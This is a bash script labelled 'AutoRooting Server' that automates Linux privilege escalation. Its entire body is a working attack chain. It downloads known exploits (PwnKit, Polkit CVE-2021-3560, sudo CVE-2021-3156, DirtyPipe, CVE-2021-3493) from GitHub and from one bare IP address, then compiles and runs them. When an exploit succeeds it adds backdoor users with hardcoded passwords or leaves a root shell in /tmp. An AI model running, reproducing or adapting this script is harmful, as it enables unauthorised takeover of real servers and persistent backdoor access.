#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'

uname=$(uname -a)
version=$(uname -r)
hostname=$(uname -n)

echo -e "$yellow ===================================================="
echo -e "$okegreen              AutoRooting Server                   "
echo -e "$okegreen            z-prvthax / ParanoidHax                "
echo -e "$yellow ===================================================="
echo -e "$cyan[*]$yellow hostname :$okegreen $hostname"
echo -e "$cyan[*]$yellow version :$okegreen $version"
echo -e "$cyan[*]$yellow all :$okegreen $uname"

echo -e "$yellow ===================================================="
echo -e "$yellow                   Testing PWNKIT...."
echo -e "$yellow ====================================================$white"
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit;chmod +x ./PwnKit
if [[ $(./PwnKit id) =~ "root" ]];
then
   echo -e "$cyan[+]$okegreen Exploit Successfull"
   ./PwnKit id
   exit
   echo -e "$yellow ===================================================="
else
   echo -e "$cyan[-]$red Exploit PwnKit Failed"
   echo -e "$yellow ===================================================="
   rm -rf PwnKit
   echo -e "$yellow ===================================================="
   echo -e "$yellow             Testing POLKIT CVE-2021-3560....    "
   echo -e "$yellow ====================================================$white"
   wget -q https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh; mv poc.sh pol.sh;curl --silent -fsSL --insecure https://raw.githubusercontent.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/main/poc.sh -o pol.sh
   chmod +x pol.sh; ./pol.sh -u=z-prvthax -p=Heker@1337 -t=.005 -f=y
   if [[ $(cat /etc/passwd | grep z-prvthax) =~ "z-prvthax" ]];
    then
       echo -e "$cyan[+]$okegreen Exploit Successfull"
       echo -e "$cyan[+]$okegreen user: z-prvthax | password: Heker@1337"
       echo -e "$yellow ===================================================="
       exit
    else
       echo -e "$cyan[-]$red Exploit CVE-2021-3560 Failed"
       echo -e "$yellow ===================================================="
       rm -rf pol.sh
       echo -e "$yellow ===================================================="
       echo -e "$yellow                 Testing CVE-2021-3156...            "
       echo -e "$yellow ====================================================$white"
       wget -q https://raw.githubusercontent.com/HaxorSec1945/cve-exploit/main/sudoex.py;mv sudoex.py su.py; curl -fsk http://198.148.116.171/666/sudox.py -o su.py
       python su.py 0x1d90 0x0 0x7f0 0x0
       if [[ $(cat /etc/passwd | grep "haxorsec") =~ "haxorsec" ]];
       then
         echo -e "$cyan[+]$okegreen Exploit Successfull"
         echo -e "$cyan[+]$okegreen user: haxorsec | password: DigiCorp1337"
         echo -e "$yellow ===================================================="
       else
         echo -e "$cyan[-]$red Exploit CVE-2021-3156 Failed"
         rm -rf su.py
             echo -e "$yellow ===================================================="
             rm -rf exploit-1
             echo -e "$yellow ===================================================="
             echo -e "$yellow                 Testing DirtyPipe2...               "
             echo -e "$yellow ===================================================="
             echo -e "$cyan[*]$yellow Blank ? VULN..."
             echo -e "$cyan[*]$yellow ketik exit...$white"
             wget -q https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c;curl -fsk https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c -o exploit-2.c
             gcc exploit-2.c -o exploit-2 -std=gnu99
             rm -rf exploit-2.c
             chmod +x exploit-2
             ./exploit-2 '/usr/bin/sudo' 
             ./exploit-2 '/usr/bin/pkexec'
             if [[ -f /tmp/sh ]];
             then
                 echo -e "$cyan[+]$okegreen Exploit Successfull"
                 echo -e "$cyan[+]$okegreen Run : /tmp/sh"
                 echo -e "$yellow ===================================================="
                 rm -rf ./exploit-2
             else
                 echo -e "$cyan[-]$red Exploit DirtyPipe2 Failed"
                 echo -e "$yellow ===================================================="
                 rm -rf ./exploit-2
                 echo -e "$yellow ===================================================="
                 echo -e "$yellow                 Testing CVE-2021-3493...            "
                 echo -e "$yellow ====================================================$white"
                 wget -q https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c;curl -fsk https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c -o exploit.c
                 gcc exploit.c -o exploit
                 rm -rf exploit.c
                 rm -rf exploit.c.1
                 if [[ $(echo "id" | ./exploit) =~ "root" ]];
                 then
                     echo -e "$cyan[+]$okegreen Exploit Successfull"
                     echo -e "$cyan[+]$okegreen Run : echo id | ./exploit"
                     echo -e "$yellow ===================================================="
                 else
                     echo -e "$cyan[-]$red Exploit CVE-2021-3493 Failed"
                     echo -e "$yellow ===================================================="
                     rm -rf ./exploit
                     rm -rf ovlcap
            fi
        fi
    fi
fi
fi
